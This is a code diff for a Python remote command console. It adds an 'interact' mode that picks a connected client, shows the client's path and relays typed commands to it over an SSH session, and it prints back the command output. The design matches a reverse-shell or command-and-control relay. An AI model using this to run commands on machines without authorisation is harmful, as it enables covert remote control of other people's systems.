@@ -20,20 +20,40 @@ def exit_server_session():
     except OSError: pass
     server_session = None
 
-def get_client_path():
+def get_client_status():
     if server_session == None: return ""
-    server_session.send("getdir")
-    return server_session.recv(1024).decode('utf-8')
+    server_session.send("getstatusandpath")
+    return server_session.recv(1024).decode('utf-8'), server_session.recv(1024).decode('utf-8')
+
+def interact():
+    status = server_session.recv(1024).decode('utf-8')
+    if status == "clientnotfound":
+        print("Client Not Found")
+    else:
+        while status == "clientready":
+            if server_session == None: return
+            status, path = get_client_status()
+            command = input(f"{path}> ").strip()
+            if command == "exit":
+                server_session.send(command)
+                return
+            else:
+                server_session.send(command)
+                print(server_session.recv(1024).decode('utf-8'))
 
 def process_commands():
     while True:
         if server_session == None: return
-        command = input(f"S> ").strip()
+        command = input("S> ").strip()
         if command == "exit":
             server_session.send(command)
             return
-        server_session.send(command)
-        print(server_session.recv(1024).decode('utf-8'))
+        elif command.split(" ")[0] == "interact":
+            interact()
+        else:
+            server_session.send(command)
+            print(server_session.recv(1024).decode('utf-8'))
+
 
 #connect to the remote ssh server and recieve commands to be #executed and send back output
 def ssh_command(server_address, server_port, username, password):
